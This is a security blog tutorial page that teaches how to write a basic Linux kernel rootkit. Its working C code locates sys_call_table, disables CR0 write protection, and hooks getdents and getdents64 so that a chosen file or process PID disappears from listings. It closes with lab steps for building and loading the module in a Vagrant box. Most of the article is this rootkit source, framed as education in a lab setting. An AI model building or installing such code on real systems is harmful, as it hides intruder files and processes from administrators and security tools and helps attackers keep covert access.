<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=51372&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Linux Kernel Rootkit Basics · x86sec</title>

  <meta name="description" content="Vulnerability research, kernel exploitation, and reverse engineering.">
  <meta name="author" content="Grant Foudree">

  
  <meta property="og:title" content="Linux Kernel Rootkit Basics">
  <meta property="og:type" content="website">
  <meta property="og:url" content="http://localhost:51372/post/linux-kernel-rootkit/">

  
  <link rel="canonical" href="http://localhost:51372/post/linux-kernel-rootkit/">
  <link rel="alternate" type="application/rss+xml" title="x86sec" href="http://localhost:51372/index.xml">

  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="stylesheet" href="/css/main.css">

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
</head>
<body><header class="site-header">
  <div class="container">
    <a class="site-logo" href="/" data-text="[x86sec]"><span class="bracket">[</span>x86sec<span class="bracket">]</span></a>
    <nav class="site-nav">
      
      <a href="/"
         class="active">
        posts
      </a>
      
      <a href="/about/"
         class="">
        about
      </a>
      
    </nav>
  </div>
</header>
<main>
<div class="container">

  
  <div class="page-hero">
    <h1>Linux Kernel Rootkit Basics</h1>
    
    <div class="hero-meta">
      <span><span class="dot">date</span> March 8, 2020</span>
      
      <span><span class="dot">read</span> 5 min</span>
      
      <span>
        
        <a href="/tags/hypervisor" class="tag">hypervisor</a>
        
        <a href="/tags/stack-smashing" class="tag">stack-smashing</a>
        
        <a href="/tags/buffer-overflow" class="tag">buffer overflow</a>
        
        <a href="/tags/security" class="tag">security</a>
        
        <a href="/tags/kernel" class="tag">kernel</a>
        
        <a href="/tags/linux" class="tag">linux</a>
        
      </span>
      
    </div>
    
  </div>

  
  <div class="post-content">
    <article class="prose">
      <h2 id="rootkits">Rootkits</h2>
<p>Rootkits are an advanced form of malware that leverage elevated privileges to hide themselves from the operating system. In this post we will go over how to write a basic rootkit that is capable of hiding files and processes on Linux.</p>
<h2 id="listing-files-in-a-directory">Listing files in a directory</h2>
<p>Let&rsquo;s look at a simple C program that can list files in a directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dirent.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	DIR <span style="color:#f92672">*</span>d <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>(<span style="color:#e6db74">&#34;.&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>dire;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> ((dire <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>(d)) <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dire<span style="color:#f92672">-&gt;</span>d_name);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">closedir</span>(d);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that the <code>readdir()</code> function is called to get the files in a folder, however we&rsquo;re interested in going as low-level as possible to see what we need to hook in the kernel to manipulate the listed files for all programs. A good way of doing this is to use the <code>strace</code> tool to log all of the syscalls a program invokes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strace./a.out
</span></span><span style="display:flex;"><span>munmap<span style="color:#f92672">(</span>0x7fa11faa0000, 133984<span style="color:#f92672">)</span>          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;.&#34;</span>, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>fstat<span style="color:#f92672">(</span>3, <span style="color:#f92672">{</span>st_mode<span style="color:#f92672">=</span>S_IFDIR|S_ISVTX|0777, st_size<span style="color:#f92672">=</span>12288, ...<span style="color:#f92672">})</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>brk<span style="color:#f92672">(</span>NULL<span style="color:#f92672">)</span>                               <span style="color:#f92672">=</span> 0x55ce40037000
</span></span><span style="display:flex;"><span>brk<span style="color:#f92672">(</span>0x55ce40058000<span style="color:#f92672">)</span>                     <span style="color:#f92672">=</span> 0x55ce40058000
</span></span><span style="display:flex;"><span>getdents<span style="color:#f92672">(</span>3, /* <span style="color:#ae81ff">28</span> entries */, 32768<span style="color:#f92672">)</span>    <span style="color:#f92672">=</span> <span style="color:#ae81ff">1376</span>
</span></span><span style="display:flex;"><span>fstat<span style="color:#f92672">(</span>1, <span style="color:#f92672">{</span>st_mode<span style="color:#f92672">=</span>S_IFCHR|0620, st_rdev<span style="color:#f92672">=</span>makedev<span style="color:#f92672">(</span>136, 4<span style="color:#f92672">)</span>, ...<span style="color:#f92672">})</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>write<span style="color:#f92672">(</span>1, <span style="color:#e6db74">&#34;.\n&#34;</span>, 2.<span style="color:#f92672">)</span>                      <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>write<span style="color:#f92672">(</span>1, <span style="color:#e6db74">&#34;..\n&#34;</span>, 3..<span style="color:#f92672">)</span>                     <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span></code></pre></div><p>Several syscalls are invoked by our program and right before we start seeing some recognized files printed out (&quot;.&quot;, &ldquo;..&rdquo;), <code>getdents()</code> is called. This is the syscall
that is used to get directory entries on Linux and therefore is what we want to hook to hide files.</p>
<h2 id="hooking-syscalls">Hooking Syscalls</h2>
<h2 id="syscall-table">Syscall Table</h2>
<p>In Linux, there is an <a href="https://elixir.bootlin.com/linux/v5.5.7/source/arch/x86/entry/syscall_64.c#L27">array in the kernel that contains pointers to all of the syscalls.</a></p>
<p><code>asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1]</code></p>
<p>The index into this array corresponds to the syscall number which you can <a href="https://syscalls.kernelgrok.com/">look up here</a>. Because of this, it is quite easy to hook a syscall function as we simply need to replace the function pointer for that syscall number to point to a function we define.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Pointer to sys_call_table in memory
</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>syscall_table <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xdeadbeef</span>;
</span></span><span style="display:flex;"><span>syscall_table[__NR_getdents] <span style="color:#f92672">=</span> hooked_getdents;
</span></span></code></pre></div><h2 id="modifying-syscall-table">Modifying Syscall Table</h2>
<p>Since the memory region of the kernel containing the <code>sys_call_table</code> pointer is marked read-only, we can&rsquo;t modify it (even as ring 0) without first changing the permissions. To do this, we have to toggle the <a href="https://en.wikipedia.org/wiki/Control_register#CR0">WP bit (bit 16) in the CR0 register</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">write_cr0</span>(<span style="color:#a6e22e">read_cr0</span>() <span style="color:#f92672">&amp;</span> (<span style="color:#f92672">~</span> <span style="color:#ae81ff">0x10000</span>)); <span style="color:#75715e">//Enable write access
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">write_cr0</span>(<span style="color:#a6e22e">read_cr0</span>() <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x10000</span>); <span style="color:#75715e">//Restore write protection
</span></span></span></code></pre></div><h2 id="getting-the-address">Getting The Address</h2>
<p>Finally, we need to get the address of the <code>sys_call_table</code> array inside the kernel. There are numerous ways to do this, but we will use a simple one below.</p>
<p>The <code>/proc/kallsyms</code> file contains a mapping of kernel symbols to addresses and thankfully includes the <code>sys_call_table</code> symbol we are interested in. We can see that in our instance,
it is located at <code>0xffffffff9fe00240</code>.</p>
<p><strong>Note</strong>: this will change across systems and even reboots as the kernel memory map is randomized for security reasons.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vagrant@ubuntu-bionic:~$ sudo cat /proc/kallsyms  | grep sys_call_table
</span></span><span style="display:flex;"><span>ffffffff9fe00240 R sys_call_table
</span></span><span style="display:flex;"><span>ffffffff9fe01600 R ia32_sys_call_table
</span></span></code></pre></div><p>Another, and perhaps easier way, is to use the <code>kallsyms_lookup_name()</code> function which returns a pointer to the symbol passed as a parameter. We can find the address of <code>sys_call_table</code> with the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> table <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>) <span style="color:#a6e22e">kallsyms_lookup_name</span>(<span style="color:#e6db74">&#34;sys_call_table&#34;</span>);
</span></span></code></pre></div><h2 id="putting-it-all-together">Putting it all together</h2>
<p>Combining the steps above, in order to hook a syscall the steps will be roughly as follows:</p>
<ol>
<li>Get the address of the <code>sys_call_table</code> pointer</li>
<li>Allow write access to kernel memory</li>
<li>Hook syscall function</li>
<li>Restore write protection to kernel memory</li>
</ol>
<h2 id="hiding-files">Hiding Files</h2>
<p>As we saw above, the <code>getdents()</code> and <code>getdents64()</code> syscalls are used to get the the files in a directory, so we will want to hook these to hide files.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> table <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>) <span style="color:#a6e22e">kallsyms_lookup_name</span>(<span style="color:#e6db74">&#34;sys_call_table&#34;</span>); <span style="color:#75715e">//Lookup table entry point
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">write_cr0</span>(<span style="color:#a6e22e">read_cr0</span>() <span style="color:#f92672">&amp;</span> (<span style="color:#f92672">~</span> <span style="color:#ae81ff">0x10000</span>)); <span style="color:#75715e">//Enable write access
</span></span></span><span style="display:flex;"><span>original_getdents <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)table[__NR_getdents];
</span></span><span style="display:flex;"><span>original_getdents64 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)table[__NR_getdents64];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>table[__NR_getdents] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) my_getdents; <span style="color:#75715e">//Hook getdents with our function
</span></span></span><span style="display:flex;"><span>table[__NR_getdents64] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) my_getdents64;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write_cr0</span>(<span style="color:#a6e22e">read_cr0</span>() <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x10000</span>); <span style="color:#75715e">//Restore write protection
</span></span></span></code></pre></div><p>Now we will define our own function that implements <code>getdents()</code> and hides the file <code>secret.txt</code> by removing it from the list of files.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">my_getdents</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> linux_dirent<span style="color:#f92672">*</span> dirp, 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> ret;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> linux_dirent<span style="color:#f92672">*</span> cur <span style="color:#f92672">=</span> dirp;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Call original getdents
</span></span></span><span style="display:flex;"><span>  ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">original_getdents</span>(fd, dirp, count); 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (pos <span style="color:#f92672">&lt;</span> ret) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_prefix</span>(cur<span style="color:#f92672">-&gt;</span>d_name, <span style="color:#e6db74">&#34;secret.txt&#34;</span>)) { <span style="color:#75715e">// Insert your check here
</span></span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Remove hidden file from list
</span></span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> reclen <span style="color:#f92672">=</span> cur<span style="color:#f92672">-&gt;</span>d_reclen;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> next_rec <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)cur <span style="color:#f92672">+</span> reclen;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)dirp <span style="color:#f92672">+</span> ret <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)next_rec;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memmove</span>(cur, next_rec, len);
</span></span><span style="display:flex;"><span>      ret <span style="color:#f92672">-=</span> reclen;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    pos <span style="color:#f92672">+=</span> cur<span style="color:#f92672">-&gt;</span>d_reclen;
</span></span><span style="display:flex;"><span>    cur <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent<span style="color:#f92672">*</span>) ((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)dirp <span style="color:#f92672">+</span> pos);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ret;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="hiding-processes">Hiding Processes</h2>
<p>On Linux, process information is stored in the <code>/proc/{pid}</code> folder and tools like <code>ps</code> read these entries to report on what processes are running. Since we already know how to hide files, all we need to do is hide the file that is the entry inside the <code>/proc</code> folder and it will not show up when <code>ps</code> is called!</p>
<p>The quickest way to do this is substitute the filename check from above with the PID:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_prefix</span>(cur<span style="color:#f92672">-&gt;</span>d_name, <span style="color:#e6db74">&#34;5048&#34;</span>)) { <span style="color:#75715e">// Insert your PID here
</span></span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Remove hidden file from list
</span></span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> reclen <span style="color:#f92672">=</span> cur<span style="color:#f92672">-&gt;</span>d_reclen;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> next_rec <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)cur <span style="color:#f92672">+</span> reclen;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)dirp <span style="color:#f92672">+</span> ret <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)next_rec;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memmove</span>(cur, next_rec, len);
</span></span><span style="display:flex;"><span>      ret <span style="color:#f92672">-=</span> reclen;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>However this might hide some other files unintentionally, so it might be wise to check the full path.</p>
<h2 id="demo">Demo</h2>
<p>Try it yourself!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vagrant init gfoudree/rootkit-dev --box-version <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>vagrant up
</span></span><span style="display:flex;"><span>vagrant ssh
</span></span></code></pre></div><p>Now build and install the kernel module:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>make
</span></span><span style="display:flex;"><span>sudo insmod file_hider.ko
</span></span></code></pre></div><p>You should now notice that <code>secret.txt</code> is missing from the files in the current directory. Remove the kernel module <code>sudo rmmod file_hider</code> and observe that it appears again.</p>

    </article>

    
    
    <div class="pagination" style="margin-top:3rem;">
      <a href="http://localhost:51372/post/advanced-qemu-debugging/">← Advanced QEMU Debugging - Trace Events</a>
      <a href="http://localhost:51372/post/hypervisor-stack-guard/">StackSupervisor - a Hypervisor-based Stack Guard →</a>
    </div>
    
  </div>

</div>

  </main><footer class="site-footer">
  <div class="container">
    <div class="footer-left">
      <strong>x86sec</strong> — a cybersecurity blog<br>
      &copy; 2026 Grant Foudree
    </div>
    <div class="footer-links">
      <a href="https://github.com/gfoudree" rel="noopener">github</a>
    </div>
  </div>
</footer>
<script src="/js/main.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
</body>
</html>
